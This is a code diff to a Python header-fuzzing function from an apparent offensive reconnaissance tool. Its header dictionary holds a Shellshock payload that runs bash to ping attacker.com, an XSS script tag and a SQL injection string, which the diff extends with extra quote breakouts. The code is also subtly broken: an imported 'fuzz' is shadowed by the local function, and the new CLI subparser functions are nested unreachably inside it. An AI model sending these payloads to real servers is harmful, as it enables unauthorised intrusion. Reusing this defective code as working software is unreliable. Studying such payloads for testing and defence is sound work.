@@ -1,4 +1,5 @@
 import requests
+from autorecon.core.fuzzer import fuzz
 
 def fuzz(target_url):
     print(f"\n[+] Starting Fuzzing on {target_url}")
@@ -23,8 +24,7 @@ def fuzz(target_url):
     fuzz_headers = {
         "User-Agent": "() { :;}; echo; /bin/bash -c 'ping attacker.com'",
         "Referer": "<script>alert('hacked')</script>",
-        "X-Forwarded-For": "127.0.0.1' OR 1=1--"
-
+        "X-Forwarded-For": "127.0.0.1'\") OR 1=1--"
     }
     try:
         r = requests.get(target_url, headers=fuzz_headers, timeout=8, verify=False)
@@ -32,3 +32,11 @@ def fuzz(target_url):
             print("    Header-based WAF or filtering detected!")
     except requests.RequestException:
         pass
+
+    def add_fuzz_subparser(subparsers):
+        parser = subparsers.add_parser("fuzz", help="Perform fuzzing on the target")
+        parser.add_argument("url", help="Target URL")
+        parser.set_defaults(func=handle_fuzz)
+
+    def handle_fuzz(args):
+        fuzz(args.url)
